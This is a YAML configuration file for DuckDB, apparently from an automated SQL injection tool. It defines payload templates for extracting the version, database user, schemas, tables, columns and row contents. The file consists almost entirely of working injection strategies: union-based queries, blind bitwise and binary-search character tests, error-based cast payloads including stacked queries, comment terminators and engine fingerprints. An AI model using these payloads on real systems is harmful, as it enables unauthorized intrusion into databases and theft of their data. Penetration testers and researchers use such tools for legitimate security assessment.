engine: Duckdb

resource:
 info: |
  version()
  || '${enclose_value_sql}'
  || current_database()
  || '${enclose_value_sql}'
  || user

 schema:
  database: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_schema r,
                       count(table_name) q
                   from information_schema.tables
                   group by r
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )

  table: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q
                   || '${enclose_value_sql}'
               from (
                   select
                       tables.table_name r,
                       '0' q
                   from information_schema.tables
                   where tables.table_schema = '${database}'
                   order by r
                   ${limit}
               ) x
           ),
           '${separator_cell_sql}'
       )

  column: |
   select
       array_to_string(
           array(
               select
                   '${enclose_value_sql}'
                   || r
                   || '${separator_qte_sql}'
                   || q
                   || '${enclose_value_sql}'
               from (
                   select
                       columns.column_name r,
                       '0' q
                   from information_schema.columns
                   where columns.table_schema = '${database}'
                   and columns.table_name = '${table}'
                   order by r
                   ${limit}
               )x
           ),
           '${separator_cell_sql}'
       )

  row:
   query: |
    select
        array_to_string(
            array(
                select
                    '${enclose_value_sql}'
                    || r
                    || '${separator_qte_sql}'
                    || q
                    || '${enclose_value_sql}'
                from (
                    select
                        substr((${fields}), 1, 775) r,
                        count(*) q
                    from ${database}.${table}
                    group by r
                    ${limit}
                )x
            ),
            '${separator_cell_sql}'
        )
   fields:
    field: cast(coalesce(${field.value}, '') as string)
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead_pipe}'
       || coalesce(
           substr(
               (${injection}),
               ${window.char},
               65536
           ),
           ''
       )
       || '${trail_sql}'
  limit: limit 65536 offset ${limit.value}
  failsafe: cast((1337${indice}7330%2b1) as string)
  calibrator: repeat('${calibrator_sql}', 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - duckdb
   orderByErrorMessage:
    - "Error: ORDER term out of range - should be between"
   engineSpecific: case when ${test} then array_length([])else 1 end=0

 union:
  indices: union select ${indices}
  capacity: (select '${lead_pipe}' || ${indice} || ${calibrator})
  orderBy: order by 1337

 binary:
  test:
   bit: |
    0 != (
        ascii(
            substr(
                (${injection}),
                ${window.char},
                1
            )
        )
        %26${bit}
    )
   # engine uses collations for char comparison, not ascii, forcing ascii comparison
   bin: |
    substr(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchr(${mid.int})
   truthyBin:
    - chr(97)%3E%3Dchr(97)
    - chr(97)%3E%3Dchr(65)
    - chr(97)%3E%3Dchr(48)
    - chr(98)%3E%3Dchr(97)
    - chr(98)%3E%3Dchr(66)
    - chr(49)%3E%3Dchr(48)
   falsyBin:
    - chr(97)%3E%3Dchr(98)
    - chr(65)%3E%3Dchr(97)
    - chr(66)%3E%3Dchr(98)
    - chr(66)%3E%3Dchr(97)
    - chr(48)%3E%3Dchr(65)
    - chr(48)%3E%3Dchr(49)
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}

 error:
  method:

   - name: Cast:or
     query: |
      /* ERROR: invalid input syntax for type numeric: "<sqli>" */
      or 1 = cast((
          ${window}
          ) as numeric
      )
     capacity: 255

   - name: Cast:and
     query: |
      and 1 = cast((
          ${window}
          ) as numeric
      )
     capacity: 255

   - name: Cast:none
     query: |
      cast((
          ${window}
          ) as numeric
      )
     capacity: 255

   - name: Cast:stack
     query: |
      ; select cast((
          ${window}
          ) as numeric
      )
     capacity: 255